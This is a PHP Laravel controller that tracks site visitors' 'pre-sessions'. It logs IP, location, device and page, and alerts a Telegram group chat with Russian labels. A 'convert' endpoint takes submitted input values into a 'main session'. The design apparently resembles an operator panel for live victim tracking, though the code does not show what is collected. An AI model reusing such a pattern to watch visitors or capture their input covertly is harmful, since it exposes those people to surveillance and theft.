<?php

namespace App\Http\Controllers;

use App\DTOs\TelegramMessageDTO;
use App\Http\Requests\CreatePreSessionRequest;
use App\Http\Requests\UpdateOnlineStatusRequest;
use App\Models\PreSession;
use App\Services\PreSessionService;
use App\Services\TelegramService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;

class TrackingController extends Controller
{
    public function __construct(
        private PreSessionService $preSessionService,
        private TelegramService $telegramService,
    ) {}
    
    /**
     * Get all pre-sessions for dashboard
     */
    public function index(Request $request): JsonResponse
    {
        $filters = $request->only(['country', 'device_type', 'status']);
        $sessions = $this->preSessionService->getAll($filters);
        $statistics = $this->preSessionService->getStatistics();
        
        return response()->json([
            'success' => true,
            'sessions' => $sessions,
            'statistics' => $statistics,
        ]);
    }
    
    /**
     * Create a pre-session for tracking before main session
     */
    public function create(CreatePreSessionRequest $request): JsonResponse
    {
        $preSession = $this->preSessionService->create(
            $request,
            $request->input('page_name', 'Unknown'),
            $request->input('page_url')
        );

        $groupChatId = $this->telegramService->getGroupChatId();
        if ($groupChatId) {
            $status = $preSession->isCurrentlyOnline() ? '🟢 Онлайн' : '🔴 Оффлайн';
            $country = trim(($preSession->country_name ?? '') . ' ' . ($preSession->city ?? ''));
            $country = $country !== '' ? $country : '-';
            $page = $preSession->page_name ?? '-';
            $url = $preSession->page_url ?? '-';
            $device = $preSession->device_type ?? '-';

            $text = implode("\n", [
                '🛰 <b>Pre-session зашла</b>',
                '',
                "🆔 <code>{$preSession->id}</code>",
                "🌐 IP: <code>{$preSession->ip_address}</code>",
                "🌍 {$country}",
                "📄 {$page}",
                "📱 {$device}",
                "{$status}",
                '',
                "🔗 <code>{$url}</code>",
            ]);

            $keyboard = [
                [
                    InlineKeyboardButton::make(
                        text: '🟢 Онлайн',
                        callback_data: "presession:online:{$preSession->id}",
                    ),
                ],
            ];

            $dto = TelegramMessageDTO::create(
                chatId: $groupChatId,
                text: $text,
                keyboard: $keyboard,
            );

            $this->telegramService->sendMessage($dto);
        }
        
        return response()->json([
            'success' => true,
            'pre_session_id' => $preSession->id,
            'tracking_data' => [
                'ip' => $preSession->ip_address,
                'country' => $preSession->country_name,
                'country_code' => $preSession->country_code,
                'city' => $preSession->city,
                'locale' => $preSession->locale,
                'device_type' => $preSession->device_type,
            ]
        ]);
    }
    
    /**
     * Update pre-session with online status
     */
    public function updateOnlineStatus(UpdateOnlineStatusRequest $request, PreSession $preSession): JsonResponse
    {
        $isOnline = $request->input('is_online', false);
        $updated = $this->preSessionService->updateOnlineStatus($preSession, $isOnline);
        
        return response()->json([
            'success' => $updated,
            'is_online' => $isOnline,
            'last_seen' => now()->toISOString(),
        ]);
    }
    
    /**
     * Get pre-session info
     */
    public function show(PreSession $preSession): JsonResponse
    {
        return response()->json([
            'success' => true,
            'data' => $preSession
        ]);
    }
    
    /**
     * Convert pre-session to main session
     */
    public function convert(Request $request, PreSession $preSession): JsonResponse
    {
        $sessionData = $request->validate([
            'input_type' => 'required|string',
            'input_value' => 'required|string',
        ]);
        
        $session = $this->preSessionService->convertToMainSession($preSession, $sessionData);
        
        return response()->json([
            'success' => true,
            'session_id' => $session->id,
            'pre_session_id' => $preSession->id,
        ]);
    }
}
